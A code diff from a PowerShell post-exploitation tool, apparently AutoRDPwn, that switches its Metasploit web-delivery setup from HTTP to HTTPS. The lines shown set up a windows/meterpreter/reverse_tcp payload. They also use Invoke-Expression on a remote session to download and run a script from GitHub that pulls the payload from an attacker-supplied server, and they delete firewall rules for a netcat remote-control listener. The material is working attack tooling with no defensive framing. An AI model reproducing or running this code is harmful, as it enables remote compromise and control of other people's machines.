@@ -393,9 +393,9 @@ function Remove-Exclusions {
 	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
 	Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
-	Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 4433" ; Write-host "set SSL false" ; Write-host "set target 2"
+	Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 4433" ; Write-host "set SSL true" ; Write-host "set target 2"
         Write-host "set payload windows/meterpreter/reverse_tcp" ; Write-host "set LHOST $metaserver"
-	Write-host "set LPORT 4444" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit -j"
+	Write-host "set LPORT 4444" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit"
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
 
 	if($backdoor -like 'X'){ $input = 'x' ; continue }
@@ -557,7 +557,7 @@ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubu
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1')
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
-Invoke-MetasploitPayload "http://$using:metaserver`:4433/$using:metarandom" -verbose
+Invoke-MetasploitPayload "https://$using:metaserver`:4433/$using:metarandom" -verbose
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500 }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
